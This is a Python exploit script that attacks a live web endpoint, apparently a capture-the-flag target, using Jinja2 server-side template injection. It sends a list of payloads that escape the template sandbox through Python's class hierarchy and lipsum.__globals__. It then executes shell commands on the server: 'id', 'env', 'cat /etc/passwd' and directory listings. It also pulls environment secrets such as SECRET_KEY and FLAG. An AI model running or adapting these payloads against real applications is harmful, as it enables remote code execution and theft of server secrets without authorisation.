#!/usr/bin/env python3
import requests, json

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

def ssti(payload):
    r = s.post(BASE + '/api/sign/preview',
               json={'lines': [payload, '', '', '']},
               timeout=20)
    try:
        data = r.json()
        return data.get('lines', [None])[0]
    except:
        return r.text[:500]

# Confirm it's Jinja2-like
print('7*7 =', ssti('{{7*7}}'))
print('7*"7" =', ssti('{{"7"*7}}'))

# Try to read environment / globals
tests = [
    "{{self}}",
    "{{self.__dict__}}",
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request}}",
    "{{request.environ}}",
    "{{request.environ.keys()}}",
    "{{request.environ.get('SECRET_KEY')}}",
    "{{request.environ.get('FLAG')}}",
    "{{namespace}}",
    "{{globals()}}",
    "{{lipsum}}",
    "{{lipsum.__globals__}}",
    "{{lipsum.__globals__['os']}}",
    "{{lipsum.__globals__['os'].environ}}",
    "{{lipsum.__globals__['os'].environ.items()|list}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('env').read()}}",
    "{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}",
    "{{lipsum.__globals__['os'].popen('ls /').read()}}",
    "{{lipsum.__globals__['os'].popen('ls').read()}}",
    "{{lipsum.__globals__.get('os')}}",
]

for t in tests:
    result = ssti(t)
    print(f'\n>>> {t}\n    -> {str(result)[:400]}')
